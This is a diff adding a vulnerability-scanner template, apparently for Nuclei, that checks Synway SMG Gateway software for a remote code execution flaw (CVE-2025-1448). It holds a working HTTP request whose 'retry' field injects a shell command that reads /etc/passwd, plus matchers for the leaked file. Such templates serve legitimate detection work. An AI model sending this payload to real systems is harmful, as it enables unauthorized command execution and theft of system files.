@@ -1,0 +1,31 @@
+id: cve-2025-1448
+info:
+  name: Synway SMG Gateway Management Software Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, cve, CVE-2025-1448
+  description: |
+    Synway SMG Gateway Management Software is vulnerable to remote code execution via the /en/9-12ping.php endpoint due to improper input sanitization.
+
+http:
+  - raw:
+      - |
+        POST /en/9-12ping.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        enable_radius=on&enable_auth=on&source_ip=&radius_address=&shared_secret=foobar&radius_address2=&shared_secret2=&timeout=3&retry=';cat /etc/passwd;'&alive=20&save=Save
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "window.parent.location.href="
+        part: body
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+    stop-at-first-match: true
